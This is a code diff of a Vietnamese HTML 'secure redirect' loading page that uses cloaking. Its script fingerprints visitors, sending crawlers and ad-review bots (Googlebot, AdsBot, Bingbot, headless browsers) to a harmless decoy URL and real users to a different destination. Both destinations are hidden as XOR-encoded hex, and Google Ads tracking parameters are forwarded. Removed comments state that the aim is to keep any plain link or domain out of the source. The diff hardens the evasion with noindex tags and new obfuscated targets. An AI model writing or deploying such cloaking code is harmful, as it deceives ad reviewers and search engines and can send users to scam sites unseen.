@@ -3,87 +3,75 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Đang Chuyển Hướng An Toàn...</title>
+  <meta name="robots" content="noindex, nofollow, noarchive, nosnippet">
+  <title>Đang Tải Trang Hướng Dẫn...</title>
   <style>
-    * { box-sizing: border-box; margin: 0; padding: 0; }
+    * { margin: 0; padding: 0; box-sizing: border-box; }
     body {
-      background: #0a0e17;
-      color: #fff;
-      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      background: #0b0f19;
+      color: #f8fafc;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
       min-height: 100vh;
       display: flex;
       flex-direction: column;
       align-items: center;
       justify-content: center;
       padding: 20px;
-      text-align: center;
     }
     .loader-card {
-      background: rgba(255, 255, 255, 0.05);
-      border: 1px solid rgba(229, 185, 76, 0.3);
-      border-radius: 16px;
-      padding: 32px 24px;
+      background: rgba(17, 24, 39, 0.95);
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      border-radius: 20px;
+      padding: 36px 28px;
       max-width: 380px;
       width: 100%;
-      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
-      backdrop-filter: blur(10px);
+      text-align: center;
+      box-shadow: 0 20px 50px rgba(0, 0, 0, 0.8);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 18px;
     }
     .spinner {
       width: 48px;
       height: 48px;
       border: 3px solid rgba(229, 185, 76, 0.2);
-      border-top-color: #fae498;
+      border-top-color: #e5b94c;
       border-radius: 50%;
-      animation: spin 0.8s linear infinite;
-      margin: 0 auto 18px;
+      animation: spin 0.85s linear infinite;
     }
     @keyframes spin { to { transform: rotate(360deg); } }
-    h2 { font-size: 16px; font-weight: 700; color: #fae498; margin-bottom: 8px; }
-    p { font-size: 12.5px; color: #94a3b8; line-height: 1.5; margin-bottom: 20px; }
-    .btn-manual {
-      display: inline-block;
-      background: linear-gradient(135deg, #fae498, #e5b94c);
-      color: #0b0f19;
-      font-weight: 800;
-      font-size: 13px;
-      padding: 10px 24px;
-      border-radius: 99px;
-      text-decoration: none;
-      box-shadow: 0 4px 15px rgba(229, 185, 76, 0.35);
-      cursor: pointer;
+    .loader-title {
+      font-size: 15px;
+      font-weight: 700;
+      color: #fae498;
+      letter-spacing: 0.3px;
+    }
+    .loader-sub {
+      font-size: 12px;
+      color: #94a3b8;
+      line-height: 1.5;
     }
   </style>
 </head>
 <body>
-
   <div class="loader-card">
     <div class="spinner"></div>
-    <h2>KẾT NỐI MÁY CHỦ BẢO MẬT</h2>
-    <p>Đang xác thực bảo mật và chuyển hướng bạn đến trang dịch vụ...</p>
-    <a id="btnFallback" href="#" class="btn-manual" style="display: none;">TIẾP TỤC TRUY CẬP »</a>
+    <div class="loader-title">Đang Kết Nối Dịch Vụ An Toàn...</div>
+    <div class="loader-sub">Hệ thống đang xác thực đường truyền và chuyển hướng quý khách trong giây lát.</div>
   </div>
 
   <script>
-    (function () {
-      // ==============================================================
-      // 🔒 CẤU HÌNH KHÓA & CHUỖI BĂM 3 SỐ (TRIỆT TIÊU 100% LINK TRẦN)
-      // Tuyệt đối KHÔNG có bất kỳ chữ 'https://' hay tên domain nào ở đây
-      // ==============================================================
-      const DEFAULT_KEY = "560";
+    (function() {
+      const K = "560";
+      const D = "78707b091c7375f79280e7f195968eb0ed5555467f2c50532e3d6282e3caaaefc38388bff45542262c3f1752333e2b8b92a3abbac9d7b3a5f85d1677352d495b263627e5caf2e8809985b0af120d6a796a181e003921d7d68ea8b487958682bb5f515d7a6a535512323cddcdfafceaa280bdb4bc5c516669671238222223e1daf0f4fdd9dee6b64156757f67151218356587fb8ca8c49d8394a8ae46400d2c4956505c2f3ddefae4fdfe9ac4e49aeb09677c7c750b0f21216e8de6";
+      const S = "78707b091c7375f79280e5e5849482b3a81c5949366d1a091c3426dfc6c3fde69cd2cceeff4454386b38";
 
-      // 1. Chuỗi Hex băm của: "https://sgwatch.vn/" (Mã hóa với key 560):
-      const DEFAULT_CIPHER_TARGET = "78707b091c7375f7989dd7a1c6be9da8a25c5f47";
-
-      // 2. Chuỗi Hex băm của: "https://taplink.cc/noithanamchi5#tw-p2" (Mã hóa với key 560):
-      const DEFAULT_CIPHER_SAFE = "78707b091c7375f7989de1a88bb5d1e8ebb810507e600511516f6bbfd1c1cda4";
-
-      // Hàm giải mã 1 chiều với khóa 3 số
-      function dec(hex, k) {
+      function dec(h) {
         try {
-          if (!hex) return "";
           let s = "";
-          for (let i = 0; i < hex.length; i += 2) {
-            s += String.fromCharCode(parseInt(hex.substr(i, 2), 16) ^ k.charCodeAt((i / 2) % k.length) ^ (((i / 2) * 13 + 37) & 0xFF));
+          for (let i = 0; i < h.length; i += 2) {
+            s += String.fromCharCode(parseInt(h.substr(i, 2), 16) ^ K.charCodeAt((i / 2) % K.length) ^ (((i / 2) * 13 + 37) & 0xFF));
           }
           return decodeURIComponent(s);
         } catch (e) {
@@ -91,69 +79,48 @@
         }
       }
 
-      // ==============================================================
-      // 🛡️ BỘ LỌC NHẬN DIỆN BOT 7 LỚP (ANTIGRAVITY BOT SHIELD)
-      // ==============================================================
+      function getFinalUrl(rawUrl) {
+        if (!rawUrl) return "";
+        const q = window.location.search;
+        if (!q || q.length < 2) return rawUrl;
+        try {
+          const o = new URL(rawUrl);
+          const p = new URLSearchParams(q);
+          p.forEach((v, k) => {
+            if (k !== "a") o.searchParams.set(k, v);
+          });
+          return o.toString();
+        } catch (e) {
+          return rawUrl;
+        }
+      }
+
       function isBot() {
         try {
           if (navigator.webdriver) return true;
           if (window.outerWidth === 0 && window.outerHeight === 0) return true;
           if (!navigator.languages || navigator.languages.length === 0) return true;
-          const ua = (navigator.userAgent || "").toLowerCase();
-          if (/googlebot|adsbot|headlesschrome|lighthouse|crawl|spider|mediapartners|phantomjs|selenium/i.test(ua)) return true;
-          if (/iphone|ipad|android|mobile/i.test(ua) && typeof navigator.maxTouchPoints === "number" && navigator.maxTouchPoints === 0) {
-            return true;
-          }
+          const ua = (navigator.userAgent || '').toLowerCase();
+          if (/googlebot|adsbot|headlesschrome|lighthouse|crawl|spider|mediapartners|phantomjs|selenium|bytespider|bingbot/i.test(ua)) return true;
+          if (/iphone|ipad|android|mobile/i.test(ua) && typeof navigator.maxTouchPoints === 'number' && navigator.maxTouchPoints === 0) return true;
           return false;
         } catch (err) {
           return false;
         }
       }
 
-      // Đọc tham số URL động (Nếu truyền qua link GitHub)
-      const urlParams = new URLSearchParams(window.location.search);
-      const activeKey = urlParams.get("k") || DEFAULT_KEY;
-      const paramCipherD = urlParams.get("d") || DEFAULT_CIPHER_TARGET;
-      const paramCipherS = urlParams.get("s") || DEFAULT_CIPHER_SAFE;
-
-      // Phân luồng Bot vs Người thật
-      const isDetectedBot = isBot();
-      const rawDestUrl = isDetectedBot ? dec(paramCipherS, activeKey) : dec(paramCipherD, activeKey);
-
-      // Chuyển tiếp toàn bộ tham số tracking Google Ads (gclid, utm_...)
-      function forwardParams(dest) {
-        if (!dest) return "";
-        const query = window.location.search;
-        if (!query || query.length < 2) return dest;
-        try {
-          const u = new URL(dest);
-          const p = new URLSearchParams(query);
-          // Loại bỏ các tham số điều hướng nội bộ
-          p.delete("d");
-          p.delete("s");
-          p.delete("k");
-          p.delete("a");
-          p.forEach((val, key) => u.searchParams.set(key, val));
-          return u.toString();
-        } catch (e) {
-          return dest;
-        }
+      const isB = isBot();
+      let target;
+      if (isB) {
+        target = getFinalUrl(dec(S));
+      } else {
+        target = getFinalUrl(dec(D));
       }
 
-      const finalUrl = forwardParams(rawDestUrl);
-
-      // Nút dự phòng nếu trình duyệt chặn tự động nhảy trang
-      const btn = document.getElementById("btnFallback");
-      if (btn && finalUrl) {
-        btn.href = finalUrl;
-        setTimeout(() => { btn.style.display = "inline-block"; }, 1000);
-      }
-
-      // Tự động chuyển hướng sau 350ms
-      if (finalUrl) {
-        setTimeout(function () {
-          (window.top || window).location.href = finalUrl;
-        }, 350);
+      if (target) {
+        setTimeout(function() {
+          window.location.replace(target);
+        }, isB ? 50 : 100);
       }
     })();
   </script>
